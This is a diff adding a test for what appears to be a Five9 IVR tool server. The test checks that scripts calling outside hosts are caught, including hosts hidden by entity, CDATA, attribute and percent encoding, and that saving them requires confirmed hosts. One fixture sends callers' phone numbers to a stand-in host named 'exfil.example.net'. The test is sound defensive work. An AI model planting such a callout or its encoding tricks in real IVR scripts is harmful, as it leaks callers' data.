@@ -310,3 +310,44 @@ test('IVR flow node keys never resolve to prototype members', async () => {
     assert.equal(validateFlow({ entry: 'a', nodes: { a: { type: 'play', prompt: { tts: 'x' }, next: k } } }).ok, false, k);
   }
 });
+
+// ---------- 8. IVR scripts that call outside systems ----------
+
+const CALLOUT_XML = '<ivrScript><modules><query><url>https://exfil.example.net/c?ani=@Call.ANI@&amp;k=1</url></query></modules></ivrScript>';
+
+test('an IVR script that calls out to any host needs the exact host list confirmed', async () => {
+  const { ivrCallouts } = await import('../src/callouts.js');
+  const variants = [
+    [CALLOUT_XML, ['exfil.example.net']],
+    ['<a><b>https&#58;//enc.example.net/x</b></a>', ['enc.example.net']],
+    ['<a><![CDATA[https://cdata.example.net/x]]></a>', ['cdata.example.net']],
+    ['<a><c u="https://attr.example.net/x"/></a>', ['attr.example.net']],
+    ['<a><d>https%3A%2F%2Fpct.example.net%2Fp</d></a>', ['pct.example.net']],
+    ['<a><webServiceModule><target>@Call.crm_url@</target></webServiceModule></a>', []],
+  ];
+  for (const [xml, hosts] of variants) {
+    assert.deepEqual(ivrCallouts(xml).hosts, hosts, xml);
+    for (const action of ['create', 'modify']) {
+      await withFive9({}, async (calls) => {
+        await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action, name: 'Main', xml_definition: xml }), /sends call data to outside systems/, xml);
+        await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action, name: 'Main', xml_definition: xml, confirm_callout_hosts: ['other.example.com'] }), /sends call data to outside systems/);
+        assert.deepEqual(calls.map((c) => c.soap), [], 'nothing sent');
+        await callTool(cfg, 'manage_ivr_script', { action, name: 'Main', xml_definition: xml, confirm_callout_hosts: hosts });
+        assert.ok(calls.some((c) => c.soap === (action === 'create' ? 'createIVRScript' : 'modifyIVRScript')));
+      });
+    }
+  }
+  // Plain scripts and namespace declarations need nothing.
+  const plain = '<ivrScript xmlns="http://www.five9.com/ivr"><modules><play/></modules></ivrScript>';
+  assert.equal(ivrCallouts(plain).any, false);
+  await withFive9({}, async (calls) => {
+    await callTool(cfg, 'manage_ivr_script', { action: 'modify', name: 'Main', xml_definition: plain });
+    assert.ok(calls.some((c) => c.soap === 'modifyIVRScript'));
+  });
+  // get_ivr_script reports the hosts a script reaches.
+  const escaped = CALLOUT_XML.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  await withFive9({ getIVRScripts: env('getIVRScripts', `<return><name>Main</name><xmlDefinition>${escaped}</xmlDefinition></return>`) }, async () => {
+    const got = await callTool(cfg, 'get_ivr_script', { name: 'Main' });
+    assert.deepEqual(got.externalHosts, ['exfil.example.net']);
+  });
+});
